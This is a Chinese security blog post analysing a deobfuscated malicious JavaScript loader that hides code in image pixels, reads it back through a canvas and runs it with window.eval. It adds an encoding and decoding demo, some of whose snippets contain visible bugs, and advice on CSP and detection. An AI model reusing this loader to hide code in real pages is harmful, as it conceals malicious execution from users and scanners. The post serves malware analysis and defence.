---
title: "黑产代码解密--利用canvas加载代码"
author: Neal
summary: "本文围绕《黑产代码解密--利用canvas加载代码》梳理web security、安全和前端相关的背景、方法和实践细节，可作为排查与学习记录。"
description: ""
tags: [安全, 前端]
categories: [web security]
date: "2018-08-12"
lastmod: "2026-08-08"
---

前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：

最初的代码是经过混淆的，代码经过整理如下：

```javascript
var createImgElement = function(urla, b) {
    var imgElement = document.createElement('img');
    var canvasEle = document.createElement('canvas');
    imgElement['crossOrigin'] = true;
    imgElement['onload'] = function() {
        canvasEle.width = this.width;
        canvasEle.height = this.height;
        var canvasContext = canvasEle.getContext('2d')
        canvasContext.drawImage(this, 0, 0, this.width, this.height);
        for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), 
        cancasDataLength = canvasContext.data.length, arr = [], i = 0;
            i < cancasDataLength;
            i += 4) {
            var code = canvasContext.data[i]
            var code1 = canvasContext.data[i + 1]
            var code2 = canvasContext.data[i + 2]
            canvasContext.data[i + 2].toString(16);
            1 == code1.length && (code1 = 0 + code1);
            1 == code2.length && (code2 = 0 + code2);
            0 != Number(code + code1 + code2) && arr.push(String.fromCharCode(Number(code + code1 + code2)));
        }
        window.eval(arr.join(''));
        console.log(arr.join(''));
        b && b();
    }
    imgElement.src = urla;
};
```

这段代码的主要目的是通过使用一个图片的连接，将这个图片加载到 canvas 中，再利用 canvas 去获取恶意代码并执行。通过图片去隐藏信息是一种常见的做法，这段就是通过 canvas 去执行图片中隐含的恶意代码。这段还支持传入回调函数，若回调函数存在，则执行回调函数。

在这里还利用一个计算机图像的知识，即像素中的 RGBA 值。Canvas 中的 ImageData 对象中每一个像素都包含了4个信息，即 RGBA 值。

* R - 红色 (0-255)
* G - 绿色 (0-255)
* B - 蓝色 (0-255)
* A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的)

通过将代码转化为 ascii 码，将其隐藏在图片中的 RGB 信息中，黑产的 alpha 值都设置的为255。这样非常巧妙地就实现了代码信息和图片之间的转换。

这里涉及到一个 canvas 和图片之间的相互转化。下面提供两个相互转化的函数：

```javascript
var canvasToImg = fucntion(image) {
    var canvas = document.createElement('canvas');
    canvas.width = image.width;
    canvas.height = image.height;
    canvas.getContext('2d').drawImage(image, width, height);
    return canvas;
}

var imgToCanvas = function(canvas) {
    var image = new Image();
    image.src = canvas.toDataUrl('image/png');
    return image;
}
```

所以黑产也是通过将恶意代码放入到图片之中，从而以后可以通过 canvas 去读取恶意代码。下面写一个小的 demo 来复现这样一个简单的过程：

```javascript
var createImgByCode = function(codeStr, width, height) {
    var imgElement = document.createElement('img');
    var canvasEle = document.createElement('canvas');
    canvasEle.width = width;
    canvasEle.height = height;
    var canvasContext = canvasEle.getContext('2d');
    var data = new Array(4 * width * height);
    for (var i = 0; i < codeStr.length; i += 4) {
        var c = codeStr[i];
        var charCode = c.charCodeAt();
        var code = 0;
        var code1 = 16;
        var code2 = charCode - code1;
        data[i] = code;
        data[i + 1] = code1;
        data[i + 2] = code2;
        data[i + 3] = 255;
    }
    data = Uint8ClampedArray.from(data);
    var imgData = new ImageData(data, width, height);
    canvasContext.putImageData(imgData, 0, 0);
    imgElement.src = canvasEle.toDataURL("image/png");
    imgElement.width = width;
    imgElement.height = height;
    imgElement.crossOrigin = ' ';
    document.querySelector("#container").appendChild(imgElement);
}

var readCodeFromImg = function() {
    var img = document.querySelector('#container img');
    var width = 20;
    var height = 20;
    var canvas = document.createElement('canvas');
    canvas.width = width;
    canvas.height = height;
    var context = canvas.getContext('2d');
    context.drawImage(img, 0, 0, width, height);
    for (var context = context.getImageData(0, 0, width, height), 
        cancasDataLength = context.data.length, arr = [], i = 0;
        i < cancasDataLength;
        i += 4) {
        var code = context.data[i];
        var code1 = context.data[i + 1];
        var code2 = context.data[i + 2];
        1 == code1.length && (code1 = 0 + code1);
        1 == code2.length && (code2 = 0 + code2);
        0 != Number(code + code1 + code2) && arr.push(String.fromCharCode(Number(code + code1 + code2)))
    }
    console.log(arr.join(''));
}

createImgByCode("14324dfjkkdf432473724afjdfshjkdfkl53453453425dlkfklsdf", 20, 20);
readCodeFromImg();
```

`createImgByCode` 函数可以将任意字符串转化为一个图片，接着通过 canvas 去加载代码。不过这里面有一个问题，就是通过`createImgByCode` 函数生成的图片是一个 base64 图片，不能够直接被加载，这个图片必须被存储为 png 格式才能够通过另一个函数去加载代码。

以上。

欢迎搜索微信号 mad_coder 或者扫描二维码关注公众号：



> **（原外链配图已失效移除，请以正文说明为准）**




## 分析收获

黑产前端常把真实逻辑藏在：

- 图片像素 / canvas 像素读回  
- 多重 `eval` / `Function`  
- 动态域名与特征混淆  

用 canvas 承载代码，是为了绕过简单静态特征与部分 WAF 关键字检测。

## 防护与检测建议

1. CSP 限制 `unsafe-eval` 与外来脚本  
2. 对异常 `canvas` + 大量像素读写做行为检测  
3. 邮件/落地页走沙箱复现  
4. 不要对「看起来只是图片」的请求放松审计  

## 合规

分析样本仅用于防御研究；不要传播未脱敏的完整黑产武器化代码。

## 小结

对抗样本是最好的教材之一：它们用尽浏览器能力边界。理解 canvas 加载链，有助于写更好的检测规则与应急手册。


## 分析环境建议

在隔离虚拟机中打开样本，断网或假 DNS，使用代理记录所有出站。对 canvas 相关 API 下断点，观察像素数据如何转成字符串与函数。过程记录比一次「跑通」更有长期价值。


## 延伸阅读与实践

把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。

若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。

对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。
